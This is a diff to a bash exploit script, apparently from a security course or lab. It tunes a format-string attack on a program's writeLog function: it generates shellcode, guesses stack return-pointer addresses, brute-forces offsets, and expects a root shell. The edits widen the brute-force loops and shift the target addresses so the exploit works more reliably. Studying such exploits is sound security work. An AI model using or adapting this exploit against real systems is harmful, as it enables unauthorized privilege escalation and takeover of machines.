@@ -302,7 +302,7 @@ if [[ $# -gt 0 && $1 == "-s" ]]; then
   exit 0
 fi
 
-SHELLCODE=`./payload.py 300 2`
+SHELLCODE=`./payload.py 300 3`
 
 if [[ $? == -1 ]]; then
   echo "failed to generate shellcode"
@@ -314,7 +314,7 @@ echo "Shellcode: ${SHELLCODE}"
 touch temp_file
 
 OFFSET=0
-RET_PTR_LOC="bffff54C"  # The frame for writeLog shouldn't come before this
+RET_PTR_LOC="bffff56C"  # The frame for writeLog shouldn't come before this
 ATTACK_JMP_ADDR="804C328"
 
 # Now that we store the address part of the format string on the stack in main
@@ -326,10 +326,10 @@ echo "Format address length: $FORMAT_ADDRS_LEN"
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
-while [[ $OFFSET -lt 1 ]]; do
+while [[ $OFFSET -lt 8 ]]; do
   _OFFSET=$(( $OFFSET * 16 ))
-  PRINTF_OFFSET=0
-  while [[ $PRINTF_OFFSET -lt 1 ]]; do
+  PRINTF_OFFSET=-3
+  while [[ $PRINTF_OFFSET -lt 3 ]]; do
     echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
     FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET 1`
     FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
@@ -357,4 +357,4 @@ done
 
 rm -rf "$FORMAT_ADDRS"
 
-echo "If you didn't get a root shell then we failed... :("
+echo "You should have gotten a root shell..."
